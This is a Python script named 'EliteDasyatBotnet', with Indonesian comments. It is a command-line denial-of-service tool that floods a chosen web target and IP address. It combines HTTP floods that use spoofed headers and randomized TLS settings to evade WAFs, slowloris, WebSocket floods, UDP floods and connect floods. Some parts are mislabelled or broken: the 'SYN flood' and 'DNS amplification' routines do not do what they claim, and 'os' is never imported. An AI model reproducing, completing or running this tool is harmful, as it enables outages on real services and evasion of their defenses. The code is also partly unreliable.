import asyncio
import aiohttp
import random
import uuid
import logging
import base64
import hashlib
import socket
import dns.resolver
import ssl
import time
import websocket
from fake_useragent import UserAgent
from typing import Dict, List

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("elite_dasyat_botnet.log")]
)

class EliteDasyatBotnet:
    def __init__(self, target_l7: str, target_l4: str, duration: int, max_connections: int = 1000):
        self.target_l7 = target_l7.rstrip('/')
        self.target_l4 = target_l4
        self.duration = duration
        self.max_connections = max_connections
        self.ua = UserAgent()
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": self._random_ip(),
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-WebSocket-Version": "13",
        }
        self.paths = [
            "/api/v{}/{}", "/{}.php", "/{}.json", "/graphql?query={}",
            "/.env", "/config/{}", "/metrics/{}", "/adversarial/{}", "/ws/{}"
        ]
        self.dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
        self.success_count = {"http": 0, "slowloris": 0, "websocket": 0, "dns": 0, "udp": 0, "tcp_syn": 0}
        self.response_times = {"http": [], "slowloris": [], "websocket": []}
        self.active_connections = 0

    def _random_ip(self) -> str:
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    def _generate_polymorphic_payload(self, size: int = 128) -> bytes:
        """Polymorphic payload ringan pake hash dan UUID."""
        base = str(uuid.uuid4()).encode() + str(time.time()).encode()
        return base64.b64encode(hashlib.sha256(base + os.urandom(8)).digest())[:size]

    def _generate_proof(self, data: bytes) -> str:
        """Simple hash-based proof untuk verifikasi serangan."""
        return hashlib.sha256(data + str(time.time()).encode()).hexdigest()[:16]

    def _obfuscate_headers(self) -> Dict:
        """Obfuscate headers untuk bypass WAF dan JA4 fingerprint."""
        headers = self.headers.copy()
        headers["User-Agent"] = self.ua.random
        headers["X-Forwarded-For"] = self._random_ip()
        headers["X-Adversarial-Tag"] = f"adv-{uuid.uuid4().hex[:8]}"
        if random.random() < 0.5:
            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "same-origin", "no-cors"])
            headers["Priority"] = f"u={random.randint(0, 4)}, i"
        if random.random() < 0.4:
            headers["X-Random-Noise"] = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz!@#$%^&*') for _ in range(random.randint(5, 20)))
        if random.random() < 0.3:
            headers["Sec-WebSocket-Key"] = base64.b64encode(os.urandom(16)).decode()
            headers["Sec-WebSocket-Protocol"] = f"apex-{uuid.uuid4().hex[:8]}"
        return headers

    def _spoof_tls_fingerprint(self) -> ssl.SSLContext:
        """TLS fingerprint spoofing untuk JA4 obfuscation."""
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        ciphers = random.sample([
            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
            "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
        ], k=random.randint(3, 6))
        context.set_ciphers(":".join(ciphers))
        return context

    async def http_flood(self):
        """L7: HTTP flood canggih dengan polymorphic payload dan WAF bypass."""
        async with aiohttp.ClientSession() as session:
            end_time = asyncio.get_event_loop().time() + self.duration
            while asyncio.get_event_loop().time() < end_time:
                start_time = asyncio.get_event_loop().time()
                try:
                    headers = self._obfuscate_headers()
                    path = random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
                    payload = self._generate_polymorphic_payload()
                    proof = self._generate_proof(payload)
                    async with session.post(
                        f"{self.target_l7}{path}",
                        headers=headers,
                        data=payload,
                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
                        timeout=0.15
                    ) as resp:
                        self.success_count["http"] += 1 if resp.status < 400 else 0
                        self.response_times["http"].append((asyncio.get_event_loop().time() - start_time) * 1000)
                        logging.info(f"L7 HTTP flood to {self.target_l7}{path}, status={resp.status}, proof={proof}")
                except Exception as e:
                    logging.error(f"L7 HTTP flood failed: {str(e)}")
                await asyncio.sleep(random.uniform(0.002, 0.01))  # Timing jitter

    async def slowloris(self):
        """L7: Slowloris untuk exhaust resource server."""
        async with aiohttp.ClientSession() as session:
            end_time = asyncio.get_event_loop().time() + self.duration
            while asyncio.get_event_loop().time() < end_time:
                start_time = asyncio.get_event_loop().time()
                try:
                    headers = self._obfuscate_headers()
                    headers["Connection"] = "keep-alive"
                    async with session.get(
                        f"{self.target_l7}/",
                        headers=headers,
                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
                        timeout=5
                    ) as resp:
                        self.success_count["slowloris"] += 1 if resp.status < 400 else 0
                        self.response_times["slowloris"].append((asyncio.get_event_loop().time() - start_time) * 1000)
                        logging.info(f"L7 Slowloris to {self.target_l7}, status={resp.status}")
                        await asyncio.sleep(random.uniform(1, 3))  # Keep connection open
                except Exception as e:
                    logging.error(f"L7 Slowloris failed: {str(e)}")
                await asyncio.sleep(random.uniform(0.01, 0.05))

    async def websocket_flood(self):
        """L7: WebSocket flood untuk exhaust koneksi."""
        end_time = asyncio.get_event_loop().time() + self.duration
        while asyncio.get_event_loop().time() < end_time:
            try:
                headers = self._obfuscate_headers()
                ws_url = self.target_l7.replace("http", "ws") + random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
                ws = websocket.WebSocket()
                ws.connect(ws_url, header=headers)
                payload = self._generate_polymorphic_payload(64)
                proof = self._generate_proof(payload)
                ws.send(payload)
                self.success_count["websocket"] += 1
                logging.info(f"L7 WebSocket flood to {ws_url}, proof={proof}")
                await asyncio.sleep(random.uniform(0.5, 2))  # Keep WebSocket open
                ws.close()
            except Exception as e:
                logging.error(f"L7 WebSocket flood failed: {str(e)}")
            await asyncio.sleep(random.uniform(0.01, 0.05))

    async def dns_amplification(self):
        """L3/L4: DNS amplification ringan."""
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.dns_servers
        end_time = asyncio.get_event_loop().time() + self.duration
        while asyncio.get_event_loop().time() < end_time:
            try:
                domain = f"{uuid.uuid4().hex}.example.com"
                answer = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: resolver.resolve(domain, 'TXT')
                )
                self.success_count["dns"] += 1
                logging.info(f"L3/L4 DNS amplification to {domain}, response={len(answer.response)} bytes")
            except Exception as e:
                logging.error(f"L3/L4 DNS amplification failed: {str(e)}")
            await asyncio.sleep(random.uniform(0.005, 0.02))

    async def udp_flood(self, port: int = 80):
        """L4: UDP flood untuk simulasi QUIC-like."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = asyncio.get_event_loop().time() + self.duration
        while asyncio.get_event_loop().time() < end_time:
            try:
                payload = self._generate_polymorphic_payload(64)
                proof = self._generate_proof(payload)
                sock.sendto(payload, (self.target_l4, port))
                self.success_count["udp"] += 1
                logging.info(f"L4 UDP flood to {self.target_l4}:{port}, payload_size={len(payload)}, proof={proof}")
            except Exception as e:
                logging.error(f"L4 UDP flood failed: {str(e)}")
            await asyncio.sleep(random.uniform(0.001, 0.005))
        sock.close()

    async def tcp_syn_flood(self, port: int = 80):
        """L4: TCP SYN flood untuk exhaust koneksi."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        end_time = asyncio.get_event_loop().time() + self.duration
        while asyncio.get_event_loop().time() < end_time:
            try:
                await asyncio.get_event_loop().sock_connect(sock, (self.target_l4, port))
                self.success_count["tcp_syn"] += 1
                logging.info(f"L4 TCP SYN flood to {self.target_l4}:{port}")
            except Exception as e:
                logging.error(f"L4 TCP SYN flood failed: {str(e)}")
            await asyncio.sleep(random.uniform(0.001, 0.005))
        sock.close()

    async def run(self):
        """Jalankan serangan multi-layer."""
        self.active_connections = self.max_connections
        tasks = []
        # Distribusi tugas: 40% HTTP flood, 20% slowloris, 15% WebSocket, 15% DNS, 10% UDP, 10% TCP SYN
        tasks.extend([self.http_flood() for _ in range(int(self.max_connections * 0.4))])
        tasks.extend([self.slowloris() for _ in range(int(self.max_connections * 0.2))])
        tasks.extend([self.websocket_flood() for _ in range(int(self.max_connections * 0.15))])
        tasks.extend([self.dns_amplification() for _ in range(int(self.max_connections * 0.15))])
        tasks.extend([self.udp_flood() for _ in range(int(self.max_connections * 0.1))])
        tasks.extend([self.tcp_syn_flood() for _ in range(int(self.max_connections * 0.1))])
        logging.info(f"Starting elite dasyat botnet on L7: {self.target_l7}, L4: {self.target_l4} with {len(tasks)} tasks")
        await asyncio.gather(*tasks)
        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
        logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")

async def main(target_l7: str, target_l4: str, duration: int):
    botnet = EliteDasyatBotnet(target_l7, target_l4, duration)
    await botnet.run()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Usage: python p.py <target_l7_url> <target_l4_ip> <duration_seconds>")
        sys.exit(1)
    target_l7_url = sys.argv[1]
    target_l4_ip = sys.argv[2]
    duration = int(sys.argv[3])
    asyncio.run(main(target_l7_url, target_l4_ip, duration))
